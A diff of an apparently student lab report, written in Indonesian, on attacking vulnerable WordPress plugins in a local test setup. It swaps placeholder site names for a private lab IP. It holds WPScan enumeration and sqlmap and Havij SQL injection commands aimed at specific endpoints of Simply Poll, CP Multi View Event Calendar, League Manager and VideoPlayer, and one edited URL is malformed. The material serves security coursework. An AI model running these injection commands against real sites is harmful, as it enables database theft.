@@ -98,7 +98,7 @@ http://192.168.100.19/wordpress/ -> (http://alamatip/nama_folder)
 ### WPScan
 
 - Buka terminal pada folder dimana wpscan berada, jalankan perintah:<pre>
-ruby wpscan.rb --url alamat_site  --enumerate vp
+ruby wpscan.rb --url http://192.168.100.19/wordpress/  --enumerate vp
 </pre>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Parameter  `vp`  pada  `--enumerate`  untuk memunculkan hasil plugin yang vulnerable.
 
@@ -117,7 +117,7 @@ ruby wpscan.rb --url alamat_site  --enumerate vp
 
 #### Plugin - Simply Poll 1.4.1
 - Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
-python sqlmap -u "http://alamat_site/wp-admin/admin-ajax.php"  --data="action=spAjaxResult&&pollid=iddaripoll" --dbms=mysql --level=5 --risk=3
+python sqlmap -u "http://192.168.100.19/wordpress/wp-admin/admin-ajax.php"  --data="action=spAjaxResult&&pollid=iddaripoll" --dbms=mysql --level=5 --risk=3
 </pre>
 
 ![simplypol 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll1.png)
@@ -139,7 +139,7 @@ python sqlmap -u "http://alamat_site/wp-admin/admin-ajax.php"  --data="action=sp
 
 #### Plugin - CP Multi View Event Calendar 1.1.7
 - Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
-python sqlmap.py --url "http://alamat_site?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1" --level=5 --risk=3 --dbms=mysql --tables -p id
+python sqlmap.py --url "http://192.168.100.19/wordpress/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1" --level=5 --risk=3 --dbms=mysql --tables -p id
 </pre>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
 
@@ -150,7 +150,7 @@ python sqlmap.py --url "http://alamat_site?action=data_management&cpmvc_do_actio
 
 #### Plugin - League Manager 3.9.11
 - Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
-python sqlmap.py --url "http://alamat_site?match=1" --level 5 --risk 3 --dbms mysql --tables
+python sqlmap.py --url "http://192.168.100.19/wordpress/2017/11/04/hello-world/?match=1" --level 5 --risk 3 --dbms mysql --tables
 </pre>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
 
@@ -162,7 +162,7 @@ python sqlmap.py --url "http://alamat_site?match=1" --level 5 --risk 3 --dbms my
 ![leaguemanager 6](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables6.png)
 
 - atau:<pre>
-python sqlmap.py --url "http://alamat_site?league_id=1&season=Winter" --level 5 --risk 3 --dbms mysql --tables
+python sqlmap.py --url "http://192.168.100.19/wordpress/2017/11/04/hello-world/?league_id=1&season=Winter" --level 5 --risk 3 --dbms mysql --tables
 </pre>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
 
@@ -179,8 +179,8 @@ python sqlmap.py --url "http://alamat_site?league_id=1&season=Winter" --level 5 
 
 #### Plugin - VideoPlayer 1.5.16
 
-- Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
-python sqlmap.py --url "http://alamat_site?/wp-admin/admin-ajax.php?action=spiderVeideoPlayerselectplaylist" --level 5 --risk 3 --dbms=mysql --tables
+- Pada terminal menjalankan perintah:<pre>
+python sqlmap.py --url "http://192.168.100.19/wordpress/wp-admin/admin-ajax.php?action=spiderVeideoPlayerselectplaylist" --level 5 --risk 3 --dbms=mysql --tables
 </pre>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
 
@@ -191,7 +191,7 @@ python sqlmap.py --url "http://alamat_site?/wp-admin/admin-ajax.php?action=spide
 
 #### Plugin - League Manager 3.9.11
 
-- Masukkan alamat `http://alamat_site?match=1` pada kolom **Target** kemudian jalankan **Analyze**. Hasil:
+- Alamat web yang dituju `http://1http://192.168.100.19/wordpress/2017/11/04/hello-world/?match=1` pada kolom **Target** kemudian jalankan **Analyze**. Hasil:
 
 ![havij leaguemanager 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/havij1.PNG)
 
